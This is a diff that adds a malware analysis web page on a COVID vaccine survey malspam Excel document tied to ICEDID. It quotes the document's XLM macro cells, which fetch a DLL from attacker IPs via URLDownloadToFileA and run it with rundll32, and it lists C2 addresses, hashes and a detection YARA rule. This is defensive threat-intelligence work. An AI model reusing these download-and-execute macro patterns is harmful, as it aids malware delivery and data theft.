@@ -1,0 +1,197 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="styles/dracula.css">
+	<script src="js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+</head>
+<body>
+<h1 id="vaccine-internet-survey-malspam">Vaccine Internet Survey Malspam</h1>
+<h4>Date: 24.5.2021</h4>
+<h4>ID: Vaccine Internet Survey Malspam</h4>
+<h4>Severity: Medium to high</h4>
+<h1 id="executive-summary">Executive Summary</h1>
+<p>The ICEDID malware, first appeared in cyberspace as banking trojan in 2017 has now evolved into a infamous point of entry for threat actors motivated to target financial institutions for credential theft and data exfiltration. During the earlier phase of ICEDID, it was deployed to primarily target banking credentials, credit card info etc. In the year of 2020 it was observed that ICEDID had evolved and was now able to perform common post-exploitation techniques and provide access to the threat actor and ultimately become severe ransomware. The main use of malware had now diverted towards post-exploitation techniques rather than credentials theft and data exfiltration.</p>
+<h1>Description</h1> 
+<p>ICEDID is propagated via malspam emails that usually contain Office file attachments. These files are created with the use of microsoft macros. Macros are a feature of Microsoft office suite that can allow run commands or make changes to the system. Thus employing this technique the ICEDID malware fetches and runs the malicious payload. In February 2020 campaigns, maldocs were spread via spam and first dropped a malware called OStap malware which later in turn dropped the ICEDID malware.<p>
+<p>The ICEDID malware seems to have a connection with the Emotet gang. The spread of ICEDID maldoc via spam has been consistent since it emerged. It has a main focus on the financial sector e-commerce and social media platforms. The ICEDID malware targets business users and business banking services.</p>
+<p>ICEDID malware that arose in 2021 was veiled as COVID Vaccine Survey and incited clients to empower macros to “decrypt” the record. This phishing style of the malware isn’t something however camouflaging as COVID Vaccine Survey is another received method. Once the macros are enabled the malware downloads the malicious payload and runs it on the system. This malicious payload allows threat actors to steal information from the system. The domain on which the command and control server was hosted on was registered on 22nd March of 2021 thus this wave malspam must have started after then and observing the ip patterns and style of attack used in malware campaigns, the malware must have originated in Russia or Eastern Europe. The threat actors behind the campaign are likely to conduct these kinds of attacks in future. Thus deploying suitable measures and defences can stop you from being low hanging fruits for threat actors.</p>
+<h1 id="detailed-static-analysis">Detailed Static Analysis</h1>
+<h2 id="analysis-of-contract_1720581471.xlsm">Analysis of Contract_1720581471.xlsm</h2>
+<h3 id="file-identification">File identification</h3>
+<ul>
+<li><p>Md5: af5d5a7a7d1d5e1a27a81a6eaa2c071b</p></li>
+<li><p>Sha1: 9f35820fb5187b3fb98dd9e8cf08b94f579abf06</p></li>
+<li><p>Sha256: 71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274</p></li>
+<li><p>Sha512: 3715e0f2fe1bebaa2829b2429073de65c93461c91793f34227d2389703594673044e121de38f082f8d66d80e6f9c908bba02ef1a1b5a15340abb66d50454b01d</p></li>
+<li><p>SSDeep: 3072:CGJuuIZ+jR5GcccccccccccccjsgLzowObh1jxILT+yw7h:CGJs06cccccccccccccgUU/hUH+yw9,”malspam.xlm”</p></li>
+<li><p>Size: 138195 B</p></li>
+<li><p>First Seen: Tue, 13 Apr 2021 21:37:12 GMT</p></li>
+</ul>
+<h4 id="virus-total">Virus Total:</h4>
+<p>https://www.virustotal.com/gui/file/71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274/details</p>
+<h4 id="inquest-labs">Inquest Labs:</h4>
+<p>https://labs.inquest.net/dfi/sha256/71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274</p>
+<h2 id="malicious-file-summary">Malicious File Summary</h2>
+<p>The malware uses a technique that employs the NOW() macro function to allow the download of files from certains time zones only. This malware could possibly be of the iceID family as it used a fairly similar technique.</p>
+<p>The malware opens up like a phishing document and states that in order to “decrypt” the document you need to enable macros.</p>
+<figure>
+<img src="images/vacine_maldoc_preview.png" alt="The preview of the xlsx file" /><figcaption aria-hidden="true">The preview of the xlsx file</figcaption>
+</figure>
+<p>The malware is macro based that uses rundll32.exe to load a malicious dll into the machine and then run a function called DllRegisterServer.</p>
+<pre><code>    &lt;row r=&quot;6&quot; spans=&quot;5:5&quot; x14ac:dyDescent=&quot;0.3&quot;&gt;
+        &lt;c r=&quot;E6&quot; s=&quot;1&quot; t=&quot;b&quot;&gt;
+        &lt;f&gt;EXEC(&quot;rundll32 &quot;&amp;&quot;..\Hodas.vyur1&quot;&amp;&quot;,DllRegisterServer&quot;)&lt;/f&gt;
+                &lt;v&gt;0&lt;/v&gt;
+        &lt;/c&gt;
+    &lt;/row&gt;</code></pre>
+<p>It registers URLDownloadToFileA API call from the Urlmon.dll with a custom name Belandes using the register function. It also concatenates strings using CONCATENATE function with 3 arguments:</p>
+<ul>
+<li>Beginning of the urls (there are 3 IP in total)</li>
+<li>Current date and time using NOW() macro function</li>
+<li>The trailing extension “.dat”</li>
+</ul>
+<p>Here the entire use of NOW() is that the sample wont download if the time isn’t correct. So I’m guessing this could be a method to implement the geo-fencing technique and affect only part of the world.</p>
+<pre><code>&lt;row r=&quot;270&quot; spans=&quot;81:83&quot; x14ac:dyDescent=&quot;0.3&quot;&gt;
+        &lt;c r=&quot;CC270&quot; s=&quot;1&quot; t=&quot;str&quot;&gt;
+            &lt;f&gt;CONCATENATE(CC276,CD266,CC273)&lt;/f&gt;
+            &lt;v&gt;http://74.119.193.131/44299,6043609954.dat&lt;/v&gt;
+        &lt;/c&gt;
+        &lt;c r=&quot;CD270&quot; s=&quot;1&quot; t=&quot;b&quot;&gt;
+            &lt;f&gt;REGISTER(CE270,CE271,CE272,CE273,,1,9)&lt;/f&gt;
+            &lt;v&gt;0&lt;/v&gt;
+        &lt;/c&gt;
+        &lt;c r=&quot;CE270&quot; s=&quot;1&quot; t=&quot;s&quot;&gt;
+            &lt;v&gt;1&lt;/v&gt;
+        &lt;/c&gt;
+    &lt;/row&gt;
+    &lt;row r=&quot;273&quot; spans=&quot;81:83&quot; x14ac:dyDescent=&quot;0.3&quot;&gt;
+        &lt;c r=&quot;CC273&quot; s=&quot;1&quot; t=&quot;str&quot;&gt;
+            &lt;f&gt;&quot;.dat&quot;&lt;/f&gt;
+            &lt;v&gt;.dat&lt;/v&gt;
+        &lt;/c&gt;
+        &lt;c r=&quot;CD273&quot; s=&quot;1&quot; t=&quot;e&quot;&gt;
+            &lt;f&gt;Belandes(0,CC270,&quot;..\Hodas.vyur2&quot;,0,0)&lt;/f&gt;
+            &lt;v&gt;#NAME?&lt;/v&gt;
+        &lt;/c&gt;
+        &lt;c r=&quot;CE273&quot; s=&quot;1&quot; t=&quot;s&quot;&gt;
+            &lt;v&gt;3&lt;/v&gt;
+        &lt;/c&gt;
+    &lt;/row&gt;</code></pre>
+<p>The URLs generated with the macro functions download the payload and save it as ...vyur2, which is basically a dll that is later run with the help of rundll32. Pretty straight forward stuff.</p>
+<pre><code>    &lt;row r=&quot;6&quot; spans=&quot;5:5&quot; x14ac:dyDescent=&quot;0.3&quot;&gt;
+        &lt;c r=&quot;E6&quot; s=&quot;1&quot; t=&quot;b&quot;&gt;
+            &lt;f&gt;EXEC(&quot;rundll32 &quot;&amp;amp;&quot;..\Hodas.vyur1&quot;&amp;amp;&quot;,DllRegisterServer&quot;)&lt;/f&gt;
+            &lt;v&gt;0&lt;/v&gt;
+        &lt;/c&gt;
+    &lt;/row&gt;</code></pre>
+<h2 id="network-communication">Network Communication</h2>
+<p>The malware tries to download dll files from 3 different IP’s in total as follows:</p>
+<ul>
+<li>188.127.254.156</li>
+<li>195.123.245.91</li>
+<li>74.119.193.131</li>
+</ul>
+<p>Further the files its downloaded are saved with the following names: + ...vyur2 + ...vyur1 + ...vyur</p>
+<p>Since the ips are down if you run the document now, this is the error that will pop up.</p>
+<figure>
+<img src="images/vacine_maldoc_error.png" alt="Error Stating dll not in malicious document" /><figcaption aria-hidden="true">Error Stating dll not in malicious document</figcaption>
+</figure>
+<h2 id="dll-analysis">DLL Analysis</h2>
+<h3 id="hodas.vyur-analysis-malicious-dll">Hodas.vyur Analysis (Malicious DLL)</h3>
+<h4 id="file-info">File Info</h4>
+<ul>
+<li><p>Md5: 0b00d514b6484a16d706d6098c336b44</p></li>
+<li><p>Sha1: 8e6b942430896c760eb54f87c8395b02284a4e24</p></li>
+<li><p>Sha256: 0bfbe59ac91d909de8ef5d3899409bf34dc7636972a6e65154cab44c85a8adee</p></li>
+<li><p>SSDeep: 1536:Vq8ByBeZnwLGM+NoV1XjeNSaziIz7Ja5j/Nj/IXoZcq+M6qaCZZtr2wS+FJZLT:Q8+Kjv4RECZnrDSGZn</p></li>
+<li><p>Compilation Time: Thu 1 April 2021 12:10:19 UTC</p></li>
+</ul>
+<p>By the time we got a malware sample the ip’s hosting the malicious dll were already down. But since we know this malware belongs to the iceID family and does mostly the same thing as his other siblings, we can take a look at the dll with the same name found here.</p>
+<p>https://bazaar.abuse.ch/sample/0bfbe59ac91d909de8ef5d3899409bf34dc7636972a6e65154cab44c85a8adee/</p>
+<p>Looking at the virtual size and raw size shows us that the dll was not packed.</p>
+<figure>
+	<img src="images/vacine_maldoc_sections.png" alt="Size table of dll in CFF explorer" /><figcaption>Sections in DLL</figcaption>
+</figure>
+<p>Exported Functions The excel macro was running the DllRegisterServer function from the dll. On analyzing it is found the dll contains one more export function called “PluginInit” that could have been used.</p>
+<p>The malware seems to be written by a competent author as it has few tricks that make it hard to analyze and the encoding scheme used by the malware causes much trouble when reversing.</p>
+<h4 id="exported-functions">Exported Functions</h4>
+<figure>
+<img src="images/vacine_maldoc_functions.png" alt="Imported DLLs" /><figcaption aria-hidden="true">Imported DLLs</figcaption>
+</figure>
+<h4 id="imported-dlls">Imported DLLs</h4>
+<figure>
+<img src="images/vacine_maldoc_dll.png" alt="Imported DLLs" /><figcaption aria-hidden="true">Imported DLLs</figcaption>
+</figure>
+<h2 id="summary-of-the-dll-working">Summary of the DLL Working</h2>
+<p>The dll onces executed will try to contact the c2 framework located at the stoikoplot.xyz domain. The c2 must have been hosted on an aws instance that is why a dns query to the aws.amazon.com is made.</p>
+<pre><code>standard query 0xe9cf a aws.amazon.com
+standard query response 0xe9cf a aws.amazon.com cname tp.8e49140c2-frontier.amazon.com cname dr49lng3n1n2s.cloudfront.net a 54.192.152.70
+standard query 0x53e4 a stoikoplot.xyz
+standard query 0x53e4 a stoikoplot.xyz
+standard query response 0x53e4 no such name a stoikoplot.xyz soa ns0.centralnic.net</code></pre>
+<p>Dns requests captured for domain in wireshark</p>
+<p>Once the IP is resolved, a request to the stoikoplot.xyz is made to verify the existence of the c2 framework. The dll follows a complex encryption scheme for all its strings and uses the method of dynamic allocation to load and call various dll during runtime.</p>
+<figure>
+<img src="images/vacine_maldoc_asm_code.png" alt="Asm code for Allocating and Writing to process" /><figcaption aria-hidden="true"></figcaption>
+</figure>
+<p>The purpose of dll is to collect data from the host, encrypt it and send it over the http protocol to the c2 server hosted at the stoikoplot.xyz domain. Thus if you notice huge amounts of http traffic being generated towards an aws host, it is very likely that you have been infiltrated.</p>
+<p>Command And Control Server Information</p>
+<pre><code>Name: stoikoplot.xyz
+Registry Domain ID: D229431128-CNIC
+Nameservers:
+ns1.taco-salad.com
+ns2.taco-salad.comDates
+
+Registry Expiration: 2022-03-22 23:59:59 UTC
+Updated: 2021-04-05 21:58:35 UTC
+Created: 2021-03-22 15:56:27 UTC</code></pre>
+<p>The domain on which the command and control was hosted on was registered on 22nd March of 2021 thus this wave malspam must have started after then and observing the ip patterns and style of attack used in malware campaigns, the malware must have origin in Russia or Eastern Europe. The threat actors behind the campaign are likely to conduct these kinds of attacks in future. Thus deploying suitable measures and defences can stop you from being low hanging fruits for threat actors. Mitigation Strategy and techniques This attack was based entirely on the phishing vector and social engineering. Thus As per recommendation and mitigation: Specific Recommendations</p>
+
+<h3>Use The Following Yara Rule For Malicious Excel Document Detection</h3>
+<pre><code>import &quot;hash&quot;
+rule covid_vaccine_malspam {
+    meta:
+        description = &quot;Detects covid 19 vaccine malspam&quot;
+        organisation = &quot;cyberpeace&quot;
+        date = &quot;2021-05-21&quot;
+
+    strings:
+        $magic = { 50 4b }
+        $image = &quot;xl/media/image1.jpeg&quot;
+
+        $macro1 = &quot;xl/macrosheets/sheet1.xmlPK&quot;
+        $macro2 = &quot;xl/macrosheets/sheet2.xmlPK&quot;
+        $macro3 = &quot;xl/macrosheets/sheet3.xmlPK&quot;
+        $macro4 = &quot;xl/macrosheets/sheet4.xmlPK&quot;
+
+    condition:
+        ($magic and $macro1 and $macro2 and $macro3 and $macro4 and $image) or
+hash.sha256(0,filesize)== &quot;71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274&quot;
+}</code></pre>
+<h1 id="references">References</h1>
+<ol>
+<li>http://www.anvari.org/fortune/Miscellaneous_Collections/291162_trojan-horse-coined-by-mit-hacker-turned-nsa-spook-dan-edwards-n.html</li>
+<li>https://searchsecurity.techtarget.com/definition/credential-theft</li>
+<li>https://en.wikipedia.org/wiki/Data_exfiltration</li>
+<li>https://www.offensive-security.com/metasploit-unleashed/msf-post-exploitation/</li>
+<li>https://malpedia.caad.fkie.fraunhofer.de/details/js.ostap</li>
+<li>https://simple.wikipedia.org/wiki/Phishing</li>
+<li>https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-server</li>
+<li>https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library</li>
+<li>https://yara.readthedocs.io/en/v4.1.0/index.html</li>
+<li>https://heimdalsecurity.com/blog/qbot-malware-replaces-icedid/</li>
+<li>https://heimdalsecurity.com/blog/banking-trojan/</li>
+<li>https://heimdalsecurity.com/blog/emotet-malware-history/</li>
+<li>https://otx.alienvault.com/browse/global?utm_userid=arduino&amp;utm_medium=InProduct&amp;utm_source=OTX&amp;utm_content=Email&amp;utm_campaign=new_pulse_from_subscribed&amp;section=All&amp;q=COVID-19&amp;include_inactive=0&amp;sort=-modified&amp;page=1&amp;indicatorsSearch=COVID-19</li>
+<li>https://labs.inquest.net/dfi/sha256/71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274</li>
+<li>https://www.virustotal.com/gui/file/71e76bc250307330ae3c7f6a3dab344304f4a1fe8e4d91097ebbe4de5523a295/relations</li>
+<li>https://www.virustotal.com/gui/file/71d51851078cd16a46ed93fa6fb95a5fbb15514560d3698c727ccf027d141274/details</li>
+<li>https://bazaar.abuse.ch/sample/0bfbe59ac91d909de8ef5d3899409bf34dc7636972a6e65154cab44c85a8adee/</li>
+</ol></body>
+</html>
